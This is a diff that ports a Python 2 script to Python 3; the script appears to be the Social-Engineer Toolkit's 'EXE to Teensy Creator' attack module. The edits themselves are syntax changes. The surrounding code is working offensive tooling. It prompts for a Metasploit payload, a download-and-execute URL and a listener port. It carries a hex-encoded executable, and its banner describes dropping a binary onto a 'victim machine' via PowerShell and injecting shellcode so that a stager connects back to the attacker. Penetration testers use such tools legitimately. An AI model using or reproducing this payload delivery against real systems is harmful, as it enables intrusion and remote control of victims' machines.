@@ -1,8 +1,14 @@
 #!/usr/bin/python
+from __future__ import print_function
 import binascii,base64,sys,os,random,string,subprocess,socket
 from src.core.setcore import *
 from src.core.dictionaries import *
 from src.core.menu.text import *
+
+try:
+    input = raw_input
+except NameError:
+    pass
 
 ################################################################################################
 #
@@ -47,7 +53,7 @@ shell_exec = "4d5a90000300000004000000ffff0000b800000000000000400000000000000000
 #########################################
 
 # print main stuff for the application
-print """
+print("""
 ********************************************************************
         BSIDES Las Vegas ----  EXE to Teensy Creator
 ********************************************************************
@@ -59,7 +65,7 @@ place it onto a victim machine through hex to binary conversion via powershell.
 
 After the conversion takes place, Alphanumeric shellcode will then be injected
 straight into memory and the stager created and shot back to you.
-"""
+""")
 
 # if we dont detect metasploit
 if not os.path.isfile(msf_path): sys.exit("\n[!] Your no gangster... Metasploit not detected, check set_config.\n")
@@ -70,7 +76,7 @@ if not os.path.isfile(msf_path): sys.exit("\n[!] Your no gangster... Metasploit 
 ###################################################
 
 show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
-payload=(raw_input(setprompt(["14"], "")))
+payload=(input(setprompt(["14"], "")))
 
 if payload == "exit" :
     exit_set()
@@ -84,7 +90,7 @@ payload=ms_payload(payload)
 # if we're downloading and executing a file
 url = ""
 if payload == "windows/download_exec":
-    url = raw_input(setprompt(["6"], "The URL with the payload to download and execute"))
+    url = input(setprompt(["6"], "The URL with the payload to download and execute"))
     url = "set URL " + url
 
 #
@@ -97,7 +103,7 @@ ipaddr = grab_ipaddress()
 try:
     # grab port number
     while 1:
-        port = raw_input(setprompt(["6"], "Port to listen on [443]"))
+        port = input(setprompt(["6"], "Port to listen on [443]"))
         # assign port if enter is specified
         if port == "": port = 443
         try:
@@ -118,11 +124,11 @@ try:
 
 # except keyboardintterupts here
 except KeyboardInterrupt:
-    print """
+    print("""
     .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
     |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
     `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
-                                               disabled.\n"""
+                                               disabled.\n""")
 
     sys.exit("\n[!] Control-C detected. Bombing out. Later Gangster...\n\n")
 
